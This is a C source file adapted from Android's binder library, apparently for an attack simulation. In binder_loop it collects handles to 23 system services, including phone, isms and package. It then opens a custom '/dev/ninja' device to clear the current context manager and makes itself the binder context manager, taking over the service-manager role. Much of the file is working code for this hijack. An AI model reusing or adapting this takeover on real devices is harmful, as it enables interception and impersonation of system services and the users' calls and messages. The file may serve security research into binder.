/* Copyright 2008 The Android Open Source Project
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "binder.h"
#include "attack_sim.h"

#define MAX_BIO_SIZE (1 << 30)

#define TRACE 0

#define LOG_TAG "Binder"

#define NSERVICES 23
#define INITING 666
#define DONE_INITING 777

int service_counter = 0;

struct service {
	int len;
	uint16_t *name;
} *services;

uint16_t svcmgr[] = {'a', 'n', 'd', 'r', 'o', 'i', 'd', '.', 'o', 's', '.', 'I', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 'M', 'a', 'n', 'a', 'g', 'e', 'r', '\0'};

uint16_t activity[] = {'a', 'c', 't', 'i', 'v', 'i', 't', 'y', '\0'};
uint16_t input[] = {'i','n','p','u','t', '\0'};
uint16_t display[] = {'d','i','s','p','l', 'a', 'y', '\0'};
uint16_t user[] = {'u','s','e','r', '\0'};
uint16_t content[] = {'c','o','n','t', 'e', 'n', 't', '\0'};
uint16_t appwidget[] = {'a','p','p','w', 'i', 'd', 'g', 'e', 't', '\0'};
uint16_t vibrator[] = {'v','i','b','r', 'a', 't', 'o', 'r', '\0'};
uint16_t mount[] = {'m','o','u','n', 't', '\0'};
uint16_t connectivity[] = {'c', 'o', 'n','n', 'e', 'c', 't', 'i', 'v', 'i', 't', 'y', '\0'};
uint16_t dropbox[] = {'d','r','o', 'p', 'b', 'o', 'x', '\0'};
uint16_t accessibility[] = {'a','c','c', 'e', 's', 's', 'i', 'b', 'i', 'l', 'i', 't', 'y', '\0'};
uint16_t audio[] = {'a','u','d', 'i', 'o', '\0'};
uint16_t iphonesubinfo[] = {'i','p','h', 'o', 'n', 'e', 's', 'u', 'b', 'i', 'n', 'f', 'o', '\0'};
uint16_t surfaceflinger[] = {'S','u','r', 'f', 'a', 'c', 'e', 'F', 'l', 'i', 'n', 'g', 'e', 'r', '\0'};
uint16_t power[] = {'p','o','w', 'e', 'r', '\0'};
uint16_t phone[] = {'p','h','o', 'n', 'e', '\0'};
uint16_t input_method[] = {'i','n','p', 'u', 't', '_', 'm', 'e', 't', 'h', 'o', 'd', '\0'};
uint16_t country_detector[] = {'c','o','u', 'n', 't', 'r', 'y', '_', 'd', 'e', 't', 'e', 'c', 't', 'o', 'r', '\0'};
uint16_t package[] = {'p','a','c', 'k', 'a', 'g', 'e', '\0'};
uint16_t media_dot_audio_policy[] = {'m','e','d', 'i', 'a', '.', 'a', 'u', 'd', 'i', 'o', '_', 'p', 'o', 'l', 'i', 'c', 'y', '\0'};
uint16_t search[] = {'s','e','a', 'r', 'c', 'h', '\0'};
uint16_t textservices[] = {'t','e','x', 't', 's', 'e', 'r','v','i', 'c', 'e', 's', '\0'};
uint16_t isms[] = {'i','s','m', 's', '\0'};
//uint16_t oisms[] = {'o', 'i','s','m', 's', '\0'};

struct data {
	uint32_t cmd;
	struct binder_txn txn;
};

void init_service_ids() {
	services = malloc(sizeof(struct service) * NSERVICES);

	services[0].len = 8;
	services[0].name = activity;

	services[1].len = 5;
	services[1].name = input;

	services[2].len = 7;
	services[2].name = display;

	services[3].len = 4;
	services[3].name = user;

	services[4].len = 7;
	services[4].name = content;

	services[5].len = 9;
	services[5].name = appwidget;

	services[6].len = 8;
	services[6].name = vibrator;

	services[7].len = 5;
	services[7].name = mount;

	services[8].len = 12;
	services[8].name = connectivity;

	services[9].len = 7;
	services[9].name = dropbox;

	services[10].len = 13;
	services[10].name = accessibility;

	services[11].len = 5;
	services[11].name = audio;

	services[12].len = 13;
	services[12].name = iphonesubinfo;

	services[13].len = 14;
	services[13].name = surfaceflinger;

	services[14].len = 5;
	services[14].name = power;

	services[15].len = 5;
	services[15].name = phone;

	services[16].len = 12;
	services[16].name = input_method;

	services[17].len = 16;
	services[17].name = country_detector;

	services[18].len = 7;
	services[18].name = package;

	services[19].len = 18;
	services[19].name = media_dot_audio_policy;

	services[20].len = 6;
	services[20].name = search;

	services[21].len = 12;
	services[21].name = textservices;

	services[22].len = 4;
	services[22].name = isms;

	//services[23].len = 5;
	//services[23].name = oisms;
}

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
	switch(cmd) {
	NAME(BR_NOOP);
	NAME(BR_TRANSACTION_COMPLETE);
	NAME(BR_INCREFS);
	NAME(BR_ACQUIRE);
	NAME(BR_RELEASE);
	NAME(BR_DECREFS);
	NAME(BR_TRANSACTION);
	NAME(BR_REPLY);
	NAME(BR_FAILED_REPLY);
	NAME(BR_DEAD_REPLY);
	NAME(BR_DEAD_BINDER);
	default: return "???";
	}
}

void bio_init_from_txn(struct binder_io *io, struct binder_txn *txn);

#if TRACE
void hexdump(void *_data, unsigned len)
{
	unsigned char *data = _data;
	unsigned count;

	for (count = 0; count < len; count++) {
		if ((count & 15) == 0)
			fprintf(stderr,"%04x:", count);
		fprintf(stderr," %02x %c", *data,
				(*data < 32) || (*data > 126) ? '.' : *data);
		data++;
		if ((count & 15) == 15)
			fprintf(stderr,"\n");
	}
	if ((count & 15) != 0)
		fprintf(stderr,"\n");
}

void binder_dump_txn(struct binder_txn *txn)
{
	struct binder_object *obj;
	unsigned *offs = txn->offs;
	unsigned count = txn->offs_size / 4;

	fprintf(stderr,"  target %p  cookie %p  code %08x  flags %08x\n",
			txn->target, txn->cookie, txn->code, txn->flags);
	fprintf(stderr,"  pid %8d  uid %8d  data %8d  offs %8d\n",
			txn->sender_pid, txn->sender_euid, txn->data_size, txn->offs_size);
	hexdump(txn->data, txn->data_size);
	while (count--) {
		obj = (void*) (((char*) txn->data) + *offs++);
		fprintf(stderr,"  - type %08x  flags %08x  ptr %p  cookie %p\n",
				obj->type, obj->flags, obj->pointer, obj->cookie);
	}
}

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
	switch(cmd) {
	NAME(BR_NOOP);
	NAME(BR_TRANSACTION_COMPLETE);
	NAME(BR_INCREFS);
	NAME(BR_ACQUIRE);
	NAME(BR_RELEASE);
	NAME(BR_DECREFS);
	NAME(BR_TRANSACTION);
	NAME(BR_REPLY);
	NAME(BR_FAILED_REPLY);
	NAME(BR_DEAD_REPLY);
	NAME(BR_DEAD_BINDER);
	default: return "???";
	}
}
#else
#define hexdump(a,b) do{} while (0)
#define binder_dump_txn(txn)  do{} while (0)
#endif

#define BIO_F_SHARED    0x01  /* needs to be buffer freed */
#define BIO_F_OVERFLOW  0x02  /* ran out of space */
#define BIO_F_IOERROR   0x04
#define BIO_F_MALLOCED  0x08  /* needs to be free()'d */

struct binder_state *binder_open(unsigned mapsize)
{
	struct binder_state *bs;

	bs = malloc(sizeof(*bs));
	if (!bs) {
		//errno = ENOMEM;
		return 0;
	}

	bs->fd = open("/dev/binder", O_RDWR);
	if (bs->fd < 0) {
		//fprintf(stderr,"binder: cannot open device (%s)\n", strerror(errno));
		goto fail_open;
	}

	bs->mapsize = mapsize;
	bs->mapped = mmap(NULL, mapsize, PROT_READ, MAP_PRIVATE, bs->fd, 0);
	if (bs->mapped == MAP_FAILED) {
		//fprintf(stderr,"binder: cannot map device (%s)\n", strerror(errno));
		goto fail_map;
	}

	return bs;

	fail_map:
	close(bs->fd);
	fail_open:
	free(bs);
	return 0;
}

void binder_close(struct binder_state *bs)
{
	munmap(bs->mapped, bs->mapsize);
	close(bs->fd);
	free(bs);
}

int binder_become_context_manager(struct binder_state *bs)
{
	return ioctl(bs->fd, BINDER_SET_CONTEXT_MGR, 0);
}

int binder_write(struct binder_state *bs, void *data, unsigned len)
{
	struct binder_write_read bwr;
	int res;
	bwr.write_size = len;
	bwr.write_consumed = 0;
	bwr.write_buffer = (unsigned) data;
	bwr.read_size = 0;
	bwr.read_consumed = 0;
	bwr.read_buffer = 0;
	res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

	if (res < 0) {
		/*fprintf(stderr,"binder_write: ioctl failed (%s)\n",
				strerror(errno));*/
	}
	return res;
}

void binder_send_reply(struct binder_state *bs,
		struct binder_io *reply,
		void *buffer_to_free,
		int status)
{
	struct {
		uint32_t cmd_free;
		void *buffer;
		uint32_t cmd_reply;
		struct binder_txn txn;
	} __attribute__((packed)) data;

	data.cmd_free = BC_FREE_BUFFER;
	data.buffer = buffer_to_free;
	data.cmd_reply = BC_REPLY;
	data.txn.target = 0;
	data.txn.cookie = 0;
	data.txn.code = 0;
	if (status) {
		data.txn.flags = TF_STATUS_CODE;
		data.txn.data_size = sizeof(int);
		data.txn.offs_size = 0;
		data.txn.data = &status;
		data.txn.offs = 0;
	} else {
		data.txn.flags = 0;
		data.txn.data_size = reply->data - reply->data0;
		data.txn.offs_size = ((char*) reply->offs) - ((char*) reply->offs0);
		data.txn.data = reply->data0;
		data.txn.offs = reply->offs0;
	}
	binder_write(bs, &data, sizeof(data));
}

int binder_parse(struct binder_state *bs, struct binder_io *bio,
		uint32_t *ptr, uint32_t size, binder_handler func)
{
	int r = 1;
	uint32_t *end = ptr + (size / 4);

	while (ptr < end) {
		uint32_t cmd = *ptr++;
#if TRACE
		fprintf(stderr,"%s:\n", cmd_name(cmd));
#endif
		switch(cmd) {
		case BR_NOOP:
			break;
		case BR_TRANSACTION_COMPLETE:
			break;
		case BR_INCREFS:
		case BR_ACQUIRE:
		case BR_RELEASE:
		case BR_DECREFS:
#if TRACE
			fprintf(stderr,"  %08x %08x\n", ptr[0], ptr[1]);
#endif
			ptr += 2;
			break;
		case BR_TRANSACTION: {
			struct binder_txn *txn = (void *) ptr;
			if ((end - ptr) * sizeof(uint32_t) < sizeof(struct binder_txn)) {
				//ALOGE("parse: txn too small!\n");
				return -1;
			}
			binder_dump_txn(txn);
			if (func) {
				unsigned rdata[256/4];
				struct binder_io msg;
				struct binder_io reply;
				int res;

				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, txn);
				res = func(bs, txn, &msg, &reply);
				binder_send_reply(bs, &reply, txn->data, res);
			}
			ptr += sizeof(*txn) / sizeof(uint32_t);
			break;
		}
		case BR_REPLY: {
			struct binder_txn *txn = (void*) ptr;

			if ((end - ptr) * sizeof(uint32_t) < sizeof(struct binder_txn)) {
				//ALOGE("parse: reply too small!\n");
				return -1;
			}

			binder_dump_txn(txn);
			bio_init_from_txn(bio, txn);
			ptr += (sizeof(*txn) / sizeof(uint32_t));

			init_service(services[service_counter].name, services[service_counter].len, bio_get_ref(bio));
			service_counter++;

			if (service_counter == NSERVICES) {
				r = DONE_INITING;
			} else {
				r = INITING;
			}
			break;
		}
		case BR_DEAD_BINDER: {
			struct binder_death *death = (void*) *ptr++;
			death->func(bs, death->ptr);
			break;
		}
		case BR_FAILED_REPLY:
			r = -1;
			break;
		case BR_DEAD_REPLY:
			r = -1;
			break;
		default:
			//ALOGE("parse: OOPS %d\n", cmd);
			return -1;
		}
	}

	return r;
}

void binder_acquire(struct binder_state *bs, void *ptr)
{
	uint32_t cmd[2];
	cmd[0] = BC_ACQUIRE;
	cmd[1] = (uint32_t) ptr;
	binder_write(bs, cmd, sizeof(cmd));
}

void binder_release(struct binder_state *bs, void *ptr)
{
	uint32_t cmd[2];
	cmd[0] = BC_RELEASE;
	cmd[1] = (uint32_t) ptr;
	binder_write(bs, cmd, sizeof(cmd));
}

void binder_link_to_death(struct binder_state *bs, void *ptr, struct binder_death *death)
{
	uint32_t cmd[3];
	cmd[0] = BC_REQUEST_DEATH_NOTIFICATION;
	cmd[1] = (uint32_t) ptr;
	cmd[2] = (uint32_t) death;
	binder_write(bs, cmd, sizeof(cmd));
}


int binder_call(struct binder_state *bs,
		struct binder_io *msg, struct binder_io *reply,
		void *target, uint32_t code)
{
	int res;
	struct binder_write_read bwr;
	struct {
		uint32_t cmd;
		struct binder_txn txn;
	} writebuf;
	unsigned readbuf[32];

	if (msg->flags & BIO_F_OVERFLOW) {
		//fprintf(stderr,"binder: txn buffer overflow\n");
		goto fail;
	}

	writebuf.cmd = BC_TRANSACTION;
	writebuf.txn.target = target;
	writebuf.txn.code = code;
	writebuf.txn.flags = 0;
	writebuf.txn.data_size = msg->data - msg->data0;
	writebuf.txn.offs_size = ((char*) msg->offs) - ((char*) msg->offs0);
	writebuf.txn.data = msg->data0;
	writebuf.txn.offs = msg->offs0;

	bwr.write_size = sizeof(writebuf);
	bwr.write_consumed = 0;
	bwr.write_buffer = (unsigned) &writebuf;

	hexdump(msg->data0, msg->data - msg->data0);
	for (;;) {
		bwr.read_size = sizeof(readbuf);
		bwr.read_consumed = 0;
		bwr.read_buffer = (unsigned) readbuf;

		res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

		if (res < 0) {
			//fprintf(stderr,"binder: ioctl failed (%s)\n", strerror(errno));
			goto fail;
		}

		res = binder_parse(bs, reply, readbuf, bwr.read_consumed, 0);
		if (res == 0) return 0;
		if (res < 0) goto fail;
	}

	fail:
	memset(reply, 0, sizeof(*reply));
	reply->flags |= BIO_F_IOERROR;
	return -1;
}

void binder_get_service(struct binder_state *bs, uint16_t *service, struct binder_write_read *bwr, struct data *data, struct binder_io *msg, void *rdata, int len)
{
	bio_init(msg, rdata, len, 4);
	data->cmd = BC_TRANSACTION;
	bio_put_uint32(msg, 0);
	bio_put_string16(msg, svcmgr);
	bio_put_string16(msg, service);

	data->txn.target = BINDER_SERVICE_MANAGER;
	data->txn.code = SVC_MGR_CHECK_SERVICE;
	data->txn.sender_euid = 0;
	data->txn.data_size = msg->data - msg->data0;
	data->txn.offs_size = ((char*) msg->offs) - ((char*) msg->offs0);
	data->txn.data = msg->data0;
	data->txn.offs = msg->offs0;

	bwr->write_size = sizeof(*data);
	bwr->write_consumed = 0;
	bwr->write_buffer = (unsigned) data;
}

void binder_loop(struct binder_state *bs, binder_handler func)
{
	int res;
	struct binder_write_read bwr;
	unsigned readbuf[32];
	unsigned rdata[256/4];
	struct data data;
	struct binder_txn txn;
	struct binder_io msg, replay;
	int ninjafd;

	init_service_ids();

	//Enter loop msg
	bwr.write_size = 0;
	bwr.write_consumed = 0;
	bwr.write_buffer = 0;

	readbuf[0] = BC_ENTER_LOOPER;
	binder_write(bs, readbuf, sizeof(unsigned));

	//Ask for activity msg
	binder_get_service(bs, services[service_counter].name, &bwr, &data, &msg, rdata, sizeof(rdata));

	for (;;) {
		bwr.read_size = sizeof(readbuf);
		bwr.read_consumed = 0;
		bwr.read_buffer = (unsigned) readbuf;
		res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

		if (res < 0) {
			//ALOGE("binder_loop: ioctl failed (%s)\n", strerror(errno));
			break;
		}

		res = binder_parse(bs, &replay, readbuf, bwr.read_consumed, func);
		if (res == 0) {
			//ALOGE("binder_loop: unexpected reply?!\n");
			break;
		}
		if (res < 0) {
			//ALOGE("binder_loop: io error %d %s\n", res, strerror(errno));
			break;
		}

		if (res == INITING) {
			binder_get_service(bs, services[service_counter].name, &bwr, &data, &msg, rdata, sizeof(rdata));
		} else if (res == DONE_INITING) {
			ninjafd = open("/dev/ninja", 0);
			ioctl(ninjafd, IOCTL_CLR_CTX_MNG);
			close(ninjafd);
			binder_become_context_manager(bs);
		}
	}
}

void bio_init_from_txn(struct binder_io *bio, struct binder_txn *txn)
{
	bio->data = bio->data0 = txn->data;
	bio->offs = bio->offs0 = txn->offs;
	bio->data_avail = txn->data_size;
	bio->offs_avail = txn->offs_size / 4;
	bio->flags = BIO_F_SHARED;
}

void bio_init(struct binder_io *bio, void *data,
		uint32_t maxdata, uint32_t maxoffs)
{
	uint32_t n = maxoffs * sizeof(uint32_t);

	if (n > maxdata) {
		bio->flags = BIO_F_OVERFLOW;
		bio->data_avail = 0;
		bio->offs_avail = 0;
		return;
	}

	bio->data = bio->data0 = (char *) data + n;
	bio->offs = bio->offs0 = data;
	bio->data_avail = maxdata - n;
	bio->offs_avail = maxoffs;
	bio->flags = 0;
}

static void *bio_alloc(struct binder_io *bio, uint32_t size)
{
	size = (size + 3) & (~3);
	if (size > bio->data_avail) {
		bio->flags |= BIO_F_OVERFLOW;
		return 0;
	} else {
		void *ptr = bio->data;
		bio->data += size;
		bio->data_avail -= size;
		return ptr;
	}
}

void binder_done(struct binder_state *bs,
		struct binder_io *msg,
		struct binder_io *reply)
{
	if (reply->flags & BIO_F_SHARED) {
		uint32_t cmd[2];
		cmd[0] = BC_FREE_BUFFER;
		cmd[1] = (uint32_t) reply->data0;
		binder_write(bs, cmd, sizeof(cmd));
		reply->flags = 0;
	}
}

static struct binder_object *bio_alloc_obj(struct binder_io *bio)
{
	struct binder_object *obj;

	obj = bio_alloc(bio, sizeof(*obj));

	if (obj && bio->offs_avail) {
		bio->offs_avail--;
		*bio->offs++ = ((char*) obj) - ((char*) bio->data0);
		return obj;
	}

	bio->flags |= BIO_F_OVERFLOW;
	return 0;
}

void bio_put_uint32(struct binder_io *bio, uint32_t n)
{
	uint32_t *ptr = bio_alloc(bio, sizeof(n));
	if (ptr)
		*ptr = n;
}

void bio_put_obj(struct binder_io *bio, void *ptr)
{
	struct binder_object *obj;

	obj = bio_alloc_obj(bio);
	if (!obj)
		return;

	obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
	obj->type = BINDER_TYPE_BINDER;
	obj->pointer = ptr;
	obj->cookie = 0;
}

void bio_put_ref(struct binder_io *bio, void *ptr)
{
	struct binder_object *obj;

	if (ptr)
		obj = bio_alloc_obj(bio);
	else
		obj = bio_alloc(bio, sizeof(*obj));

	if (!obj)
		return;

	obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
	obj->type = BINDER_TYPE_HANDLE;
	obj->pointer = ptr;
	obj->cookie = 0;
}

void bio_put_string16(struct binder_io *bio, const uint16_t *str)
{
	uint32_t len;
	uint16_t *ptr;

	if (!str) {
		bio_put_uint32(bio, 0xffffffff);
		return;
	}

	len = 0;
	while (str[len]) len++;

	if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
		bio_put_uint32(bio, 0xffffffff);
		return;
	}

	bio_put_uint32(bio, len);
	len = (len + 1) * sizeof(uint16_t);
	ptr = bio_alloc(bio, len);
	if (ptr)
		memcpy(ptr, str, len);
}

void bio_put_string16_x(struct binder_io *bio, const char *_str)
{
	unsigned char *str = (unsigned char*) _str;
	uint32_t len;
	uint16_t *ptr;

	if (!str) {
		bio_put_uint32(bio, 0xffffffff);
		return;
	}

	len = strlen(_str);

	if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
		bio_put_uint32(bio, 0xffffffff);
		return;
	}

	bio_put_uint32(bio, len);
	ptr = bio_alloc(bio, (len + 1) * sizeof(uint16_t));
	if (!ptr)
		return;

	while (*str)
		*ptr++ = *str++;
	*ptr++ = 0;
}

static void *bio_get(struct binder_io *bio, uint32_t size)
{
	size = (size + 3) & (~3);

	if (bio->data_avail < size){
		bio->data_avail = 0;
		bio->flags |= BIO_F_OVERFLOW;
		return 0;
	}  else {
		void *ptr = bio->data;
		bio->data += size;
		bio->data_avail -= size;
		return ptr;
	}
}

uint32_t bio_get_uint32(struct binder_io *bio)
{
	uint32_t *ptr = bio_get(bio, sizeof(*ptr));
	return ptr ? *ptr : 0;
}

uint16_t *bio_get_string16(struct binder_io *bio, unsigned *sz)
{
	unsigned len;
	len = bio_get_uint32(bio);
	if (sz)
		*sz = len;
	return bio_get(bio, (len + 1) * sizeof(uint16_t));
}

static struct binder_object *_bio_get_obj(struct binder_io *bio)
{
	unsigned n;
	unsigned off = bio->data - bio->data0;

	for (n = 0; n < bio->offs_avail; n++) {
		if (bio->offs[n] == off)
			return bio_get(bio, sizeof(struct binder_object));
	}

	bio->data_avail = 0;
	bio->flags |= BIO_F_OVERFLOW;
	return 0;
}

void *bio_get_ref(struct binder_io *bio)
{
	struct binder_object *obj;

	obj = _bio_get_obj(bio);
	if (!obj)
		return 0;

	if (obj->type == BINDER_TYPE_HANDLE)
		return obj->pointer;

	return 0;
}
